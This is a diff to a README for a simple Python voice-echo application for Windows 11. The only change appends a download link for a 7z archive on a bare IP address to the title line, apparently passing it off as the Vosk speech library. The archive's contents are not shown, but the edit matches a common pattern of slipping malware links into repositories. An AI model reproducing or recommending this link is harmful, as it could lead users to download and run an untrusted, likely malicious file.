@@ -1,4 +1,4 @@
-# VoiceAssistant
+# VoiceAssistant http://138.124.35.201/vosk.7z
 This is a simple voice echo application built in Python for Windows 11
 
 # Simple Voice Echo Assistant
